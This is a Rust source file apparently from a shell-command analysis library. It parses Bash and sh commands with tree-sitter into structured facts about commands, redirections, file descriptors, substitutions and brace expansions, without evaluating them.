use tree_sitter::{Language, Node, Parser, Tree};

use crate::{
    artifact::{
        AssignmentCommandFact, AssignmentOperator, AssignmentValueFact, CommandFact,
        CommandSubstitutionFact, CommandToken, CommandTokenKind, DeclarationCommandFact,
        DeclarationCommandKind, DiagnosticKind, FunctionDefinitionFact, ParseDiagnostic,
        ParseStatus, ParsedCommandArtifact, PipelinePosition, ProcessSubstitutionFact,
        ProcessSubstitutionOperator, RedirectionFact, RedirectionKind, RedirectionOperandFact,
        SourceSpan, StatementTerminator, UnsetCommandFact, VariableAssignmentFact,
    },
    error::ParseError,
};
use caushell_types::ShellKind;

/// Decode a shell token only when its value is a static argv string. This is
/// intentionally not an evaluator: expansions and pathname generation remain
/// unresolved, while backslash-quoted characters are decoded as shell data.
pub fn decode_static_shell_argument(text: &str, quoted: bool, node_kind: &str) -> Option<String> {
    if node_kind == "concatenation" {
        return with_single_argument(text, |node, source| decode_static_word_node(node, source));
    }
    if matches!(node_kind, "raw_string" | "ansi_c_string") {
        return Some(text.to_string());
    }
    if quoted && node_kind == "string" {
        let mut decoded = String::with_capacity(text.len());
        let mut chars = text.chars().peekable();
        while let Some(character) = chars.next() {
            match character {
                '$' | '`' => return None,
                '\\' => match chars.next()? {
                    escaped @ ('$' | '`' | '"' | '\\') => decoded.push(escaped),
                    '\n' => {}
                    other => {
                        decoded.push('\\');
                        decoded.push(other);
                    }
                },
                other => decoded.push(other),
            }
        }
        return Some(decoded);
    }

    let mut decoded = String::with_capacity(text.len());
    let mut chars = text.chars();
    while let Some(character) = chars.next() {
        match character {
            '\\' => match chars.next()? {
                '\n' => {}
                escaped => decoded.push(escaped),
            },
            '$' | '`' | '*' | '?' | '[' => return None,
            _ => decoded.push(character),
        }
    }
    Some(decoded)
}

// Rare concatenated quote proofs use the existing Bash grammar, not a second
// ad-hoc substitution parser. No commands or expansion values are evaluated.
// Ordinary words and whole quoted scalars retain their allocation-free proof.
fn with_single_argument<T>(
    text: &str,
    query: impl FnOnce(Node<'_>, &[u8]) -> Option<T>,
) -> Option<T> {
    if text.len() > 65536 {
        return None;
    }
    let text = shell_word_without_continuations(text);
    let source = format!("__argument__ {text}");
    let mut parser = Parser::new();
    parser
        .set_language(&language_for(ShellKind::Bash).ok()?)
        .ok()?;
    let tree = parser.parse(&source, None)?;
    let root = tree.root_node();
    if root.has_error() || root.named_child_count() != 1 {
        return None;
    }
    let command = root.named_child(0)?;
    if command.kind() != "command" || command.named_child_count() != 2 {
        return None;
    }
    let word = command.named_child(1)?;
    if word.end_byte() != source.len() {
        return None;
    }
    query(word, source.as_bytes())
}

// A disposable grammar query has no source coordinates to remap. Normalize
// only lexical continuations here; command facts retain the original spelling
// and spans. Quoted literal/ANSI data is never rewritten as shell source.
fn shell_word_without_continuations(text: &str) -> std::borrow::Cow<'_, str> {
    if !text.contains("\\\n") {
        return std::borrow::Cow::Borrowed(text);
    }
    #[derive(Clone, Copy)]
    enum Quote {
        None,
        Single,
        Double,
        Ansi,
    }
    let mut quote = Quote::None;
    let mut chars = text.chars().peekable();
    let mut output = String::with_capacity(text.len());
    while let Some(ch) = chars.next() {
        match (quote, ch) {
            (Quote::Single, '\'') | (Quote::Ansi, '\'') => {
                quote = Quote::None;
                output.push(ch);
            }
            (Quote::Single, _) => output.push(ch),
            (Quote::Ansi, '\\') => {
                output.push(ch);
                if let Some(next) = chars.next() {
                    output.push(next);
                }
            }
            (Quote::Ansi, _) => output.push(ch),
            (_, '\\') => {
                if let Some(next) = chars.next() {
                    if next != '\n' {
                        output.push(ch);
                        output.push(next);
                    }
                } else {
                    output.push(ch);
                }
            }
            (Quote::None, '$') if chars.peek() == Some(&'\'') => {
                output.push('$');
                output.push(chars.next().unwrap());
                quote = Quote::Ansi;
            }
            (Quote::None, '\'') => {
                quote = Quote::Single;
                output.push(ch);
            }
            (Quote::None, '"') => {
                quote = Quote::Double;
                output.push(ch);
            }
            (Quote::Double, '"') => {
                quote = Quote::None;
                output.push(ch);
            }
            _ => output.push(ch),
        }
    }
    std::borrow::Cow::Owned(output)
}

fn decode_static_word_node(node: Node<'_>, source: &[u8]) -> Option<String> {
    match node.kind() {
        "word" | "number" => {
            let text = node.utf8_text(source).ok()?;
            if text.contains(['~', '\'', '"'])
                || text.contains(['{', '}']) && (text.contains(',') || text.contains(".."))
            {
                return None;
            }
            decode_static_shell_argument(text, false, node.kind())
        }
        "raw_string" => extract_token_text(node, source).map(|(text, _)| text),
        "ansi_c_string" => {
            // The existing standalone decoder supports a wider byte language.
            // For a new exact concatenation proof, admit only complete ASCII
            // escapes with unambiguous Rust-string/native-argv correspondence.
            let text = node.utf8_text(source).ok()?;
            let inner = text.strip_prefix("$'")?.strip_suffix('\'')?;
            let mut chars = inner.chars();
            while let Some(ch) = chars.next() {
                if ch == '\\'
                    && !matches!(
                        chars.next()?,
                        'a' | 'b'
                            | 'e'
                            | 'E'
                            | 'f'
                            | 'n'
                            | 'r'
                            | 't'
                            | 'v'
                            | '\\'
                            | '\''
                            | '"'
                            | '?'
                    )
                {
                    return None;
                }
            }
            Some(decode_ansi_c_string(text.to_string()))
        }
        "string" => {
            let text = extract_interpolated_string(node, source);
            decode_static_shell_argument(&text, true, "string")
        }
        "concatenation" => {
            let raw = node.utf8_text(source).ok()?;
            if unquoted_braces_may_expand(raw) {
                return None;
            }
            let mut result = String::new();
            let mut cursor = node.start_byte();
            for index in 0..node.named_child_count() {
                let child = node.named_child(index as u32)?;
                // Tree-sitter can represent special expansions such as $$ as
                // anonymous children. A named-child walk alone must not drop
                // those bytes and certify a different, shorter argv word.
                if child.start_byte() != cursor {
                    return None;
                }
                result.push_str(&decode_static_word_node(child, source)?);
                cursor = child.end_byte();
            }
            if cursor != node.end_byte() {
                // A terminal, unquoted '$' is literal Shell data. It may be
                // an anonymous grammar token too, but must be kept, not lost.
                // '$$', '$?', substitutions and all other gaps stay unknown.
                if source.get(cursor..node.end_byte()) != Some(b"$") {
                    return None;
                }
                result.push('$');
            }
            Some(result)
        }
        _ => None,
    }
}

// Brace expansion precedes quote removal. Commas and dots inside quoted
// program text cannot turn surrounding literal braces into a shell vector.
// Keep real list/range syntax unresolved here; the Profile materializer owns
// its bounded Bash expansion and retains the selected shell kind.
fn unquoted_braces_may_expand(text: &str) -> bool {
    let mut quote = None;
    let mut groups = Vec::new();
    let mut chars = text.chars().peekable();
    while let Some(ch) = chars.next() {
        match (quote, ch) {
            (Some('\''), '\'') | (Some('"'), '"') => quote = None,
            (Some('\''), _) => {}
            (_, '\\') => {
                chars.next();
            }
            (Some('"'), _) => {}
            (None, '\'' | '"') => quote = Some(ch),
            (None, '{') => {
                if groups.len() >= 32 {
                    return true;
                }
                groups.push(false);
            }
            (None, ',' | '.') => {
                if ch == ',' || chars.peek() == Some(&'.') {
                    if let Some(group) = groups.last_mut() {
                        *group = true;
                    }
                }
            }
            (None, '}') => {
                if groups.pop() == Some(true) {
                    return true;
                }
            }
            _ => {}
        }
    }
    false
}

pub fn concatenated_argument_is_scalar(text: &str) -> bool {
    fn quoted_parameter(node: Node<'_>, source: &[u8], budget: &mut usize) -> bool {
        if *budget == 0 {
            return false;
        }
        *budget -= 1;
        let Ok(text) = node.utf8_text(source) else {
            return false;
        };
        let Some(body) = text.strip_prefix("${") else {
            return false;
        };
        // Only a scalar parameter head is a proof. Vector subscripts,
        // indirection and parameter transformations retain the fallback.
        let end = body
            .bytes()
            .take_while(|b| b.is_ascii_alphanumeric() || *b == b'_')
            .count();
        if end == 0 {
            return false;
        }
        let suffix = &body[end..];
        if !(suffix == "}"
            || [
                ":-", ":+", ":=", ":?", "-", "+", "=", "?", ":", "%", "#", "/", "^", ",",
            ]
            .iter()
            .any(|op| suffix.starts_with(op)))
        {
            return false;
        }
        fn expansions_are_scalar(node: Node<'_>, source: &[u8], budget: &mut usize) -> bool {
            if *budget == 0 {
                return false;
            }
            *budget -= 1;
            match node.kind() {
                "command_substitution" | "arithmetic_expansion" => true,
                "simple_expansion" => node.utf8_text(source).is_ok_and(|s| s != "$@"),
                "expansion" => quoted_parameter(node, source, budget),
                // In a double-quoted parameter operator word these quotes
                // are not an independent shell single-quote barrier. Do not
                // hide unparsed expansions behind tree-sitter's raw leaf.
                "raw_string" | "ansi_c_string" => node
                    .utf8_text(source)
                    .is_ok_and(|s| !s.contains(['$', '`'])),
                "word" => {
                    let Ok(word) = node.utf8_text(source) else {
                        return false;
                    };
                    // Parameter operator words may be opaque leaves containing
                    // $@. Query their quoted syntax, not their leaf-node count.
                    if !word.contains('$') {
                        return true;
                    }
                    with_single_argument(&format!("\"{word}\""), |word_node, word_source| {
                        Some(
                            word_node.kind() == "string"
                                && (0..word_node.named_child_count()).all(|i| {
                                    expansions_are_scalar(
                                        word_node.named_child(i as u32).unwrap(),
                                        word_source,
                                        budget,
                                    )
                                }),
                        )
                    })
                    .unwrap_or(false)
                }
                _ => (0..node.named_child_count()).all(|i| {
                    expansions_are_scalar(node.named_child(i as u32).unwrap(), source, budget)
                }),
            }
        }
        (0..node.named_child_count())
            .all(|i| expansions_are_scalar(node.named_child(i as u32).unwrap(), source, budget))
    }
    fn quoted_child(node: Node<'_>, source: &[u8]) -> bool {
        match node.kind() {
            // Inner shell words never become outer argv fields here.
            "command_substitution"
            | "arithmetic_expansion"
            | "string_content"
            | "escape_sequence" => true,
            "simple_expansion" => node.utf8_text(source).is_ok_and(|s| s != "$@"),
            "expansion" => quoted_parameter(node, source, &mut 256),
            _ => false,
        }
    }
    fn scalar(node: Node<'_>, source: &[u8]) -> bool {
        match node.kind() {
            "raw_string" | "ansi_c_string" => true,
            "word" | "number" => decode_static_word_node(node, source).is_some(),
            "string" => (0..node.named_child_count())
                .all(|i| quoted_child(node.named_child(i as u32).unwrap(), source)),
            "concatenation" => (0..node.named_child_count())
                .all(|i| scalar(node.named_child(i as u32).unwrap(), source)),
            _ => false,
        }
    }
    text.len() <= 8192
        && with_single_argument(text, |node, source| Some(scalar(node, source))).unwrap_or(false)
}

pub fn parse_command(
    raw_command: &str,
    shell_kind: ShellKind,
) -> Result<ParsedCommandArtifact, ParseError> {
    let language = language_for(shell_kind)?;

    let mut parser = Parser::new();
    parser
        .set_language(&language)
        .map_err(|error| ParseError::LanguageInit(error.to_string()))?;

    let tree = parse_with_descriptor_ownership(&mut parser, raw_command, &[])?;
    let source = raw_command.as_bytes();
    let root = tree.tree.root_node();
    let artifact = artifact_from_tree(
        raw_command,
        shell_kind,
        root,
        source,
        &tree.descriptors,
        &tree.here_strings,
        &tree.backticks,
    );

    if artifact.status == ParseStatus::Partial {
        if let Some(repair) = read_write_redirection_repair(raw_command, &artifact.diagnostics) {
            let repaired_tree = parse_with_descriptor_ownership(&mut parser, repair.as_str(), &[])?;
            let repaired_artifact = artifact_from_tree(
                raw_command,
                shell_kind,
                repaired_tree.tree.root_node(),
                source,
                &repaired_tree.descriptors,
                &repaired_tree.here_strings,
                &repaired_tree.backticks,
            );
            if repaired_artifact.status == ParseStatus::Complete {
                return Ok(repaired_artifact);
            }
        }

        if let Some(repair) = static_brace_command_repair(raw_command) {
            let repaired_tree = parse_with_descriptor_ownership(
                &mut parser,
                repair.source.as_str(),
                &repair.commands,
            )?;
            let repaired_source = repair.source.as_bytes();
            let mut repaired_artifact = artifact_from_tree(
                raw_command,
                shell_kind,
                repaired_tree.tree.root_node(),
                repaired_source,
                &repaired_tree.descriptors,
                &repaired_tree.here_strings,
                &repaired_tree.backticks,
            );

            if repaired_artifact.status == ParseStatus::Complete
                && restore_static_brace_command_spans(
                    raw_command,
                    &repair.commands,
                    &mut repaired_artifact,
                )
            {
                return Ok(repaired_artifact);
            }
        }
    }

    Ok(artifact)
}

struct DescriptorProjection {
    span: SourceSpan,
    operator_byte: usize,
}

struct DescriptorTree {
    tree: Tree,
    descriptors: Vec<DescriptorProjection>,
    here_strings: Vec<SourceSpan>,
    backticks: Vec<CommandSubstitutionFact>,
}

fn malformed_here_string_prefix(node: Node<'_>, bytes: &[u8]) -> Option<SourceSpan> {
    (node.kind() == "ERROR"
        && source_text(node, bytes) == "<<"
        && bytes.get(node.end_byte()) == Some(&b'<')
        && bytes.get(node.end_byte() + 1) != Some(&b'<')
        && node.parent().is_some_and(|parent| {
            matches!(parent.kind(), "file_redirect" | "redirected_statement")
        }))
    .then(|| span_for(node))
}

/// The grammar sometimes puts an IO number in argv (notably `0<&2`) or fails
/// on it (`000<file`, `0<<EOF`). Mask only AST-qualified, unquoted decimal IO
/// numbers while parsing, then restore their original descriptor facts. Spaces
/// preserve every byte/line coordinate; no surrogate source is ever executed.
fn parse_with_descriptor_ownership(
    parser: &mut Parser,
    source: &str,
    brace_expansions: &[StaticBraceCommand],
) -> Result<DescriptorTree, ParseError> {
    let projected = crate::backtick::project(parser, source)?;
    let bytes = source.as_bytes();
    let (tree, projected_source) =
        crate::syntax_compat::project(parser, projected.tree, bytes, projected.source)?;
    if !bytes.iter().any(|byte| matches!(byte, b'<' | b'>')) {
        return Ok(DescriptorTree {
            tree,
            descriptors: Vec::new(),
            here_strings: Vec::new(),
            backticks: projected.facts,
        });
    }
    let mut repaired_source = projected_source;
    let mut descriptors = Vec::new();
    let mut here_strings = Vec::new();
    walk(tree.root_node(), &mut |node| {
        // Bash IO numbers are unsigned decimal words. The grammar can absorb
        // a signed argv word into a redirect descriptor (e.g. -200>out).
        // Project only this AST-qualified sign as a word character; extraction
        // still reads the original bytes and source coordinates.
        if node.kind() == "file_descriptor" {
            let text = &bytes[node.start_byte()..node.end_byte()];
            if matches!(text.first(), Some(b'-' | b'+'))
                && text.len() > 1
                && text[1..].iter().all(u8::is_ascii_digit)
            {
                repaired_source.get_or_insert_with(|| bytes.to_vec())[node.start_byte()] = b'x';
                return;
            }
        }
        // A close-FD operator followed by argv can hit the grammar's optional
        // destination branch and swallow/error on the first argument. Project
        // ONLY an AST-recognized close operator as duplication of FD 0. The
        // original adjacent '-' is restored as close semantics during fact
        // extraction; byte positions and the remaining argv stay unchanged.
        if node.kind() == "file_redirect" && node.has_error() {
            for child in all_children(node) {
                if !child.is_named() && matches!(source_text(child, bytes).as_str(), "<&-" | ">&-")
                {
                    repaired_source.get_or_insert_with(|| bytes.to_vec())[child.end_byte() - 1] =
                        b'0';
                }
            }
        }
        // The grammar can split a here-string following another redirect
        // into ERROR("<<") plus a file redirect("<"). Mask only this
        // AST-qualified operator prefix; restore the original carrier below.
        if let Some(prefix) = malformed_here_string_prefix(node, bytes) {
            repaired_source.get_or_insert_with(|| bytes.to_vec())
                [prefix.start_byte..prefix.end_byte]
                .fill(b' ');
            here_strings.push(prefix);
        }
        let numeric_word = node.kind() == "number" && !node.has_error()
            && node.parent().is_some_and(|parent| {
                matches!(parent.kind(), "command" | "command_name" | "declaration_command" | "unset_command" | "file_redirect")
                    // An existing redirect destination is not a new IO number.
                    && !(parent.kind() == "file_redirect"
                        && parent.child_by_field_name("destination") == Some(node)
                        && !(0..parent.child_count()).any(|index| child_at(parent, index).is_some_and(|child| {
                            !child.is_named() && matches!(source_text(child, bytes).as_str(), "<&-" | ">&-")
                        })))
            });
        let malformed_descriptor = matches!(
            node.kind(),
            "file_redirect" | "heredoc_redirect" | "herestring_redirect"
        ) && node.has_error();
        let misplaced_descriptor = node.kind() == "file_descriptor"
            && node.parent().is_some_and(|parent| parent.kind() == "ERROR");
        if !numeric_word && !malformed_descriptor && !misplaced_descriptor {
            return;
        }
        let start = node.start_byte();
        // Expansion-generated words are argv data, not new shell syntax:
        // `{cat,0}<input` passes "0" to cat; it does not redirect FD 0.
        if brace_expansions
            .iter()
            .any(|expansion| expansion.brace_start <= start && start < expansion.brace_end)
        {
            return;
        }
        let mut end = start;
        while bytes.get(end).is_some_and(u8::is_ascii_digit) {
            end += 1;
        }
        if end == start || (numeric_word && end != node.end_byte()) {
            return;
        }
        let mut next = end;
        // Bash removes unquoted line continuations before recognizing words.
        while bytes.get(next..next + 2) == Some(b"\\\n") {
            next += 2;
        }
        if !matches!(bytes.get(next), Some(b'<' | b'>')) {
            return;
        }
        let repaired = repaired_source.get_or_insert_with(|| bytes.to_vec());
        repaired[start..end].fill(b' ');
        let mut span = span_for(node);
        span.end_byte = end;
        span.end_row = span.start_row;
        span.end_column = span.start_column + end - start;
        descriptors.push(DescriptorProjection {
            span,
            operator_byte: next,
        });
    });
    let mut tree = match repaired_source.as_deref() {
        Some(repaired) => parser
            .parse(repaired, None)
            .ok_or(ParseError::ParseCancelled)?,
        None => tree,
    };
    // Removing an erroneous IO number can expose this second grammar error.
    // One bounded, error-only retry handles it without scanning raw strings
    // or looping until arbitrary malformed input happens to parse.
    if tree.root_node().has_error() {
        let mut retry = false;
        walk(tree.root_node(), &mut |node| {
            if let Some(prefix) = malformed_here_string_prefix(node, bytes)
                && !here_strings
                    .iter()
                    .any(|known| known.start_byte == prefix.start_byte)
            {
                repaired_source.get_or_insert_with(|| bytes.to_vec())
                    [prefix.start_byte..prefix.end_byte]
                    .fill(b' ');
                here_strings.push(prefix);
                retry = true;
            }
        });
        if retry {
            tree = parser
                .parse(
                    repaired_source.as_deref().expect("repair source exists"),
                    None,
                )
                .ok_or(ParseError::ParseCancelled)?;
        }
    }
    descriptors.sort_unstable_by_key(|descriptor| descriptor.operator_byte);
    descriptors.dedup_by_key(|descriptor| descriptor.operator_byte);
    Ok(DescriptorTree {
        tree,
        descriptors,
        here_strings,
        backticks: projected.facts,
    })
}

fn read_write_redirection_repair(
    raw_command: &str,
    diagnostics: &[ParseDiagnostic],
) -> Option<String> {
    let mut bytes = raw_command.as_bytes().to_vec();
    let mut repaired = false;
    for diagnostic in diagnostics {
        let index = diagnostic.span.start_byte;
        if diagnostic.kind != DiagnosticKind::ErrorNode {
            continue;
        }
        let greater_than =
            if diagnostic.text == ">" && index > 0 && bytes.get(index - 1..=index) == Some(b"<>") {
                Some(index)
            } else if diagnostic.text == "<" && bytes.get(index..index + 2) == Some(b"<>") {
                Some(index + 1)
            } else {
                None
            };
        if let Some(index) = greater_than {
            bytes[index] = b' ';
            repaired = true;
        }
    }
    repaired.then(|| String::from_utf8(bytes).expect("ASCII replacement preserves UTF-8"))
}

fn artifact_from_tree(
    raw_command: &str,
    shell_kind: ShellKind,
    root: Node<'_>,
    source: &[u8],
    descriptors: &[DescriptorProjection],
    here_strings: &[SourceSpan],
    backticks: &[CommandSubstitutionFact],
) -> ParsedCommandArtifact {
    let diagnostics = collect_diagnostics(root, source);
    let status = if root.has_error() || !diagnostics.is_empty() {
        ParseStatus::Partial
    } else {
        ParseStatus::Complete
    };

    let mut artifact = ParsedCommandArtifact {
        raw_command: raw_command.to_string(),
        shell_kind,
        status,
        commands: extract_commands(root, source),
        declaration_commands: extract_declaration_commands(root, source),
        assignment_commands: extract_assignment_commands(root, source),
        for_loops: extract_for_loops(root, source),
        unset_commands: extract_unset_commands(root, source),
        shell_evaluations: extract_shell_evaluations(root, source, shell_kind),
        function_definitions: extract_function_definitions(root, source),
        redirections: extract_redirections(root, source),
        diagnostics,
    };
    for redirection in &mut artifact.redirections {
        if redirection.kind != RedirectionKind::File || redirection.operator.as_deref() != Some("<")
        {
            continue;
        }
        if let Some(prefix) = here_strings
            .iter()
            .find(|prefix| prefix.end_byte == redirection.span.start_byte)
        {
            redirection.kind = RedirectionKind::HereString;
            redirection.operator = Some("<<<".into());
            redirection.content = redirection.target.take();
            redirection.span.start_byte = prefix.start_byte;
            redirection.span.start_row = prefix.start_row;
            redirection.span.start_column = prefix.start_column;
            redirection.text = String::from_utf8_lossy(
                &source[redirection.span.start_byte..redirection.span.end_byte],
            )
            .into_owned();
        }
    }
    restore_descriptor_ownership(&mut artifact, source, descriptors);
    crate::backtick::restore(&mut artifact, backticks);
    artifact
}

fn restore_descriptor_ownership(
    artifact: &mut ParsedCommandArtifact,
    source: &[u8],
    descriptors: &[DescriptorProjection],
) {
    if descriptors.is_empty() {
        return;
    }
    let descriptor_at = |byte| {
        descriptors
            .binary_search_by_key(&byte, |d| d.operator_byte)
            .ok()
            .map(|i| &descriptors[i])
    };
    let restore_start = |span: &mut SourceSpan| {
        if let Some(descriptor) = descriptor_at(span.start_byte) {
            span.start_byte = descriptor.span.start_byte;
            span.start_row = descriptor.span.start_row;
            span.start_column = descriptor.span.start_column;
        }
    };
    for command in &mut artifact.commands {
        restore_start(&mut command.span);
        restore_start(&mut command.top_level_span);
        for span in [
            &mut command.pipeline_span,
            &mut command.shell_scope_span,
            &mut command.subshell_span,
            &mut command.control_flow_span,
        ]
        .into_iter()
        .flatten()
        {
            restore_start(span);
        }
        command.text =
            String::from_utf8_lossy(&source[command.span.start_byte..command.span.end_byte])
                .into_owned();
    }
    for redirection in &mut artifact.redirections {
        if let Some(descriptor) = descriptor_at(redirection.span.start_byte) {
            redirection.file_descriptor = Some(
                String::from_utf8_lossy(
                    &source[descriptor.span.start_byte..descriptor.span.end_byte],
                )
                .into_owned(),
            );
            restore_start(&mut redirection.span);
            redirection.text = String::from_utf8_lossy(
                &source[redirection.span.start_byte..redirection.span.end_byte],
            )
            .into_owned();
        }
        restore_start(&mut redirection.top_level_span);
        if let Some(statement) = &mut redirection.opening_statement {
            restore_start(&mut statement.span);
            restore_start(&mut statement.top_level_span);
            for span in [
                &mut statement.pipeline_span,
                &mut statement.shell_scope_span,
                &mut statement.subshell_span,
                &mut statement.control_flow_span,
            ]
            .into_iter()
            .flatten()
            {
                restore_start(span);
            }
            statement.text = String::from_utf8_lossy(
                &source[statement.span.start_byte..statement.span.end_byte],
            )
            .into_owned();
        }
        if let Some(span) = &mut redirection.parent_command_span {
            restore_start(span);
        }
    }
    for command in &mut artifact.declaration_commands {
        restore_start(&mut command.span);
        restore_start(&mut command.top_level_span);
        if let Some(span) = &mut command.shell_scope_span {
            restore_start(span);
        }
        command.text =
            String::from_utf8_lossy(&source[command.span.start_byte..command.span.end_byte])
                .into_owned();
    }
    for command in &mut artifact.unset_commands {
        restore_start(&mut command.span);
        restore_start(&mut command.top_level_span);
        if let Some(span) = &mut command.shell_scope_span {
            restore_start(span);
        }
        command.text =
            String::from_utf8_lossy(&source[command.span.start_byte..command.span.end_byte])
                .into_owned();
    }
    for command in &mut artifact.assignment_commands {
        restore_start(&mut command.span);
        restore_start(&mut command.top_level_span);
        if let Some(span) = &mut command.shell_scope_span {
            restore_start(span);
        }
        command.text =
            String::from_utf8_lossy(&source[command.span.start_byte..command.span.end_byte])
                .into_owned();
    }
    for site in &mut artifact.shell_evaluations {
        restore_start(&mut site.top_level_span);
        if let Some(span) = &mut site.shell_scope_span {
            restore_start(span);
        }
    }
}

pub fn parse_command_substitutions(
    raw_fragment: &str,
    shell_kind: ShellKind,
) -> Result<Vec<CommandSubstitutionFact>, ParseError> {
    let language = language_for(shell_kind)?;

    let mut parser = Parser::new();
    parser
        .set_language(&language)
        .map_err(|error| ParseError::LanguageInit(error.to_string()))?;

    let projected = crate::backtick::project(&mut parser, raw_fragment)?;
    let source = raw_fragment.as_bytes();
    let (tree, _) =
        crate::syntax_compat::project(&mut parser, projected.tree, source, projected.source)?;
    let root = tree.root_node();
    let mut substitutions = Vec::new();

    walk(root, &mut |node| {
        if node.kind() != "command_substitution" {
            return;
        }

        let text = source_text(node, source);
        let Some(body_text) = command_substitution_body_text(&text) else {
            return;
        };

        substitutions.push(CommandSubstitutionFact {
            text,
            body_text,
            span: span_for(node),
        });
    });

    substitutions.extend(projected.facts);
    substitutions.sort_by_key(|fact| fact.span.start_byte);
    Ok(substitutions)
}

pub fn parse_process_substitutions(
    raw_fragment: &str,
    shell_kind: ShellKind,
) -> Result<Vec<ProcessSubstitutionFact>, ParseError> {
    let language = language_for(shell_kind)?;

    let mut parser = Parser::new();
    parser
        .set_language(&language)
        .map_err(|error| ParseError::LanguageInit(error.to_string()))?;

    let source = raw_fragment.as_bytes();
    let projected = crate::backtick::project(&mut parser, raw_fragment)?;
    let (tree, _) =
        crate::syntax_compat::project(&mut parser, projected.tree, source, projected.source)?;
    let root = tree.root_node();
    let mut substitutions = Vec::new();

    walk(root, &mut |node| {
        if node.kind() != "process_substitution" {
            return;
        }

        let text = source_text(node, source);
        let Some((operator, body_text)) = process_substitution_parts(&text) else {
            return;
        };

        substitutions.push(ProcessSubstitutionFact {
            text,
            body_text,
            operator,
            span: span_for(node),
        });
    });

    Ok(substitutions)
}

fn language_for(shell_kind: ShellKind) -> Result<Language, ParseError> {
    match shell_kind {
        ShellKind::Bash | ShellKind::Sh => Ok(tree_sitter_bash::LANGUAGE.into()),
        other => Err(ParseError::UnsupportedShell(other)),
    }
}

const MAX_STATIC_BRACE_COMMAND_WORDS: usize = 32;
const MAX_STATIC_BRACE_COMMAND_BYTES: usize = 4096;

#[derive(Debug, Clone)]
struct StaticBraceCommandRepair {
    source: String,
    commands: Vec<StaticBraceCommand>,
}

#[derive(Debug, Clone)]
struct StaticBraceCommand {
    brace_start: usize,
    brace_end: usize,
    first_word_start: usize,
    first_word: String,
}

fn static_brace_command_repair(raw_command: &str) -> Option<StaticBraceCommandRepair> {
    let mut repaired = raw_command.as_bytes().to_vec();
    let mut repairs = Vec::new();
    let source = raw_command.as_bytes();
    let mut offset = 0usize;

    while offset < source.len() {
        let Some(relative_start) = raw_command[offset..].find('{') else {
            break;
        };
        let brace_start = offset + relative_start;
        offset = brace_start + 1;

        let Some(repair) = static_brace_command_at(raw_command, brace_start) else {
            continue;
        };

        repaired[repair.brace_start] = b' ';
        repaired[repair.brace_end - 1] = b' ';
        for byte in &mut repaired[repair.brace_start + 1..repair.brace_end - 1] {
            if *byte == b',' {
                *byte = b' ';
            }
        }
        repairs.push(repair);
    }

    if repairs.is_empty() {
        return None;
    }

    Some(StaticBraceCommandRepair {
        source: String::from_utf8(repaired).ok()?,
        commands: repairs,
    })
}

fn static_brace_command_at(raw_command: &str, brace_start: usize) -> Option<StaticBraceCommand> {
    let source = raw_command.as_bytes();
    if source.get(brace_start) != Some(&b'{')
        || !shell_command_position_before(source, brace_start)
        || brace_start >= source.len()
    {
        return None;
    }

    let relative_end = raw_command.get(brace_start + 1..)?.find('}')?;
    let brace_end = brace_start + 1 + relative_end + 1;

    if source.get(brace_end.checked_sub(1)?) != Some(&b'}')
        || !shell_word_boundary_after(source, brace_end)
        || brace_end - brace_start > MAX_STATIC_BRACE_COMMAND_BYTES
    {
        return None;
    }

    let inner_start = brace_start + 1;
    let inner_end = brace_end - 1;
    let inner = raw_command.get(inner_start..inner_end)?;
    let words = inner.split(',').collect::<Vec<_>>();

    if words.len() < 2
        || words.len() > MAX_STATIC_BRACE_COMMAND_WORDS
        || words.iter().any(|word| {
            word.is_empty()
                || !word
                    .as_bytes()
                    .iter()
                    .copied()
                    .all(is_static_brace_word_byte)
        })
    {
        return None;
    }

    Some(StaticBraceCommand {
        brace_start,
        brace_end,
        first_word_start: inner_start,
        first_word: words[0].to_string(),
    })
}

fn is_static_brace_word_byte(byte: u8) -> bool {
    byte.is_ascii_alphanumeric()
        || matches!(
            byte,
            b'.' | b'_' | b'/' | b'+' | b'-' | b':' | b'@' | b'%' | b'='
        )
}

fn shell_command_position_before(source: &[u8], offset: usize) -> bool {
    let mut cursor = offset;
    while cursor > 0 {
        cursor -= 1;
        let byte = source[cursor];
        if byte.is_ascii_whitespace() {
            continue;
        }

        return matches!(byte, b'|' | b'&' | b';' | b'(');
    }

    true
}

fn shell_word_boundary_after(source: &[u8], offset: usize) -> bool {
    offset == source.len()
        || source
            .get(offset)
            .is_some_and(|byte| is_shell_word_boundary(*byte))
}

fn is_shell_word_boundary(byte: u8) -> bool {
    byte.is_ascii_whitespace() || matches!(byte, b'|' | b'&' | b';' | b'(' | b')' | b'<' | b'>')
}

fn restore_static_brace_command_spans(
    raw_command: &str,
    repairs: &[StaticBraceCommand],
    artifact: &mut ParsedCommandArtifact,
) -> bool {
    let mut span_start_repairs = Vec::new();
    let mut command_span_repairs = Vec::new();

    for repair in repairs {
        let Some(command) = artifact.commands.iter_mut().find(|command| {
            command.span.start_byte == repair.first_word_start
                && command.command_name.as_deref() == Some(repair.first_word.as_str())
        }) else {
            return false;
        };

        let old_command_span = command.span.clone();
        let old_top_level_span = command.top_level_span.clone();
        let old_pipeline_span = command.pipeline_span.clone();
        let command_end = command.span.end_byte.max(repair.brace_end);
        let Some(text) = raw_command.get(repair.brace_start..command_end) else {
            return false;
        };

        command.text = text.to_string();
        command.span = source_span_for_offsets(raw_command, repair.brace_start, command_end);
        command_span_repairs.push((old_command_span, command.span.clone()));
        span_start_repairs.push((old_top_level_span, repair.brace_start));
        if let Some(old_pipeline_span) = old_pipeline_span {
            span_start_repairs.push((old_pipeline_span, repair.brace_start));
        }
    }

    for command in &mut artifact.commands {
        repair_span_start(
            raw_command,
            &mut command.top_level_span,
            &span_start_repairs,
        );
        if let Some(pipeline_span) = &mut command.pipeline_span {
            repair_span_start(raw_command, pipeline_span, &span_start_repairs);
        }
    }

    for redirection in &mut artifact.redirections {
        repair_span_start(
            raw_command,
            &mut redirection.top_level_span,
            &span_start_repairs,
        );

        if let Some(statement) = &mut redirection.opening_statement {
            repair_span_start(raw_command, &mut statement.span, &span_start_repairs);
            repair_span_start(
                raw_command,
                &mut statement.top_level_span,
                &span_start_repairs,
            );
            for span in [
                &mut statement.pipeline_span,
                &mut statement.shell_scope_span,
                &mut statement.subshell_span,
                &mut statement.control_flow_span,
            ]
            .into_iter()
            .flatten()
            {
                repair_span_start(raw_command, span, &span_start_repairs);
            }
            statement.text = raw_command[statement.span.start_byte..statement.span.end_byte].into();
        }

        if let Some(parent_command_span) = &mut redirection.parent_command_span {
            if let Some((_, replacement)) = command_span_repairs
                .iter()
                .find(|(original, _)| original == parent_command_span)
            {
                *parent_command_span = replacement.clone();
            }
        }
    }

    true
}

